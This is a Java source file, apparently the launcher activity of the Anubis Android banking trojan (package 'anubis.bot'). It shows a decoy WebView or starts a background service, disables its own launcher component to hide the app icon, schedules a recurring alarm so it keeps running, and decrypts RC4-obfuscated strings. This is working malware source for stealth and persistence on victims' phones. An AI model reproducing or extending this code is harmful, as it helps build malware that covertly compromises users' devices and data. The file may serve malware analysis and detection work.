package anubis.bot.myapplication.Activity;


import android.app.Activity;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.webkit.WebView;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.ServiceLookScreen;
import anubis.bot.myapplication.StartWhileGlobal;
import anubis.bot.myapplication.StartWhileRequest;
import anubis.bot.myapplication.StoreStringClass;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class MainActivity extends Activity {
    UtilsClass SF = new UtilsClass();
    Constants const_ = new Constants();
    UtilsClass utilsClass = new UtilsClass();
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


StoreStringClass store = new StoreStringClass();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        if((const_.checkActivityImage)&&(android.os.Build.VERSION.SDK_INT >= 19)){
            WebView view = new WebView(this);
            view.getSettings().setJavaScriptEnabled(true);
            view.loadUrl(const_.urlImage);
            setContentView(view);
        }else {
           startService(new Intent(this, StartWhileGlobal.class));
        }

       ComponentName CTD = new ComponentName(this, MainActivity.class);
       getPackageManager().setComponentEnabledSetting(CTD, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        try{
           SF.startCustomTimer(this, "startAlarm", Integer.parseInt(SF.SetRead(this,"Interval")));
        }catch (Exception ex){
            SF.startCustomTimer(this, "startAlarm", 10000);
        }
        if(!const_.checkActivityImage)finish();
    }



}